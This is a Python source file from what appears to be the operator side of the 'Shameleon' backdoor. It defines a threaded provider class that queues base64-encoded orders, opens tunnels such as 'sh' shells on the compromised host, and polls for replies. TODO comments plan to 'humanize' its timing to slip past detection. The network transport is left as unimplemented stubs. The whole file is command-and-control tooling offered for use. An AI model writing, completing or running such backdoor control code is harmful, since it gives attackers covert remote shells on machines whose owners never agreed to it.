#!/bin/env python3
import threading
import time
from base64 import b64decode
from base64 import b64encode
from queue import Queue
from uuid import uuid4


class ShameleonProvider(threading.Thread):
    """ Class representing a Shameleon provider.

    Shameleon providers are used to communicate with the Shameleon backdoor.
    They are used by modules to send and receive data from the backdoor.
    The ShameleonProvider class is a base class that must be inherited by
    specific providers.
    The ShameleonProvider class is a thread that will run in background.
    """

    def __init__(self):
        super().__init__()
        self._tunnels = {
            'system': {'in': Queue(), 'out': Queue()},
        }

    def run(self):
        while True:
            # Send data
            buffer: list[str] = []
            for _, streams in self._tunnels.items():
                while not streams['out'].empty():

                    buffer.append(streams['out'].get(block=False))
            if len(buffer) > 0:
                self._send_payload(buffer)
                time.sleep(1)  # TODO: Humanize and use backdoor config
            # Receive data
            incoming = self._get_payload()
            if len(incoming) > 0:
                for tunnel_id, data in incoming:
                    self._tunnels[tunnel_id]['in'].put(data)
            else:
                pass
                # TODO: Increase waiting time using config parameters
            time.sleep(1)  # TODO: Humanize and use backdoor config

    def request_tunnel(self, tunnel_type: str) -> str:
        """ Request a tunnel to the backdoor.

        This method is used to request a tunnel to the backdoor. The tunnel
        will be used to send and receive data from the backdoor.
        The tunnel is identified by a unique identifier returned by this
        method.

        Args:
            tunnel_type (str): Type of tunnel to request (e.g. 'sh')

        Raises:
            Exception: If the backdoor is unable to create the tunnel

        Returns:
            str: Unique identifier of the tunnel
        """
        print(f"[i] Requesting tunnel for '{tunnel_type}'")
        tunnel_uuid = str(uuid4()).split('-')[0]
        content = f"{tunnel_type}:{tunnel_uuid}"
        self.send_data("system", content.encode('utf-8'))
        while True:
            data = self.receive_data("system")
            if len(data) > 0:
                decoded_data = data.decode('utf-8')
                if decoded_data != 'OK':
                    raise Exception('Impossible to create tunnel: %s', decoded_data)
                print("[i] tunnel ID:", tunnel_uuid)
                self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
                return tunnel_uuid

    def send_data(self, tunnel_id: str, data: bytes):
        """ Send data to the backdoor.

        This method is used to send data to the backdoor through a tunnel.
        The tunnel is identified by its unique identifier.

        Args:
            tunnel_id (str): Unique identifier of the tunnel
            data (bytes): Data to send to the backdoor
        """
        header = f"{tunnel_id}:"
        encoded_data = b64encode(data).decode('utf-8')
        order = header + encoded_data
        self._tunnels[tunnel_id]['out'].put(order)

    def receive_data(self, tunnel_id: str) -> bytes:
        """ Receive data from the backdoor.

        This method is used to receive data from the backdoor through a tunnel.
        The tunnel is identified by its unique identifier.

        Args:
            tunnel_id (str): Unique identifier of the tunnel

        Returns:
            bytes: Data received from the backdoor
        """
        data: bytes = b''
        while not self._tunnels[tunnel_id]['in'].empty():
            encoded = self._tunnels[tunnel_id]['in'].get(block=False)
            decoded = b64decode(encoded.encode('utf-8'))
            data += decoded
        return data

    def not_handled_data(self, tunnel_id: str, data: bytes):
        """ Put not handled data in the queue.

        This method is used to put data in the queue of a tunnel. This data
        will be processed again by others modules.

        Args:
            tunnel_id (str): Unique identifier of the tunnel
            data (bytes): data to put in the reception queue
        """
        encoded = b64encode(data)
        self._tunnels[tunnel_id]['in'].put(encoded)

    # Must be implemented
    def _send_payload(self, data: list[str]):
        raise NotImplementedError()

    def _get_payload(self) -> list[tuple[str, str]]:
        raise NotImplementedError()
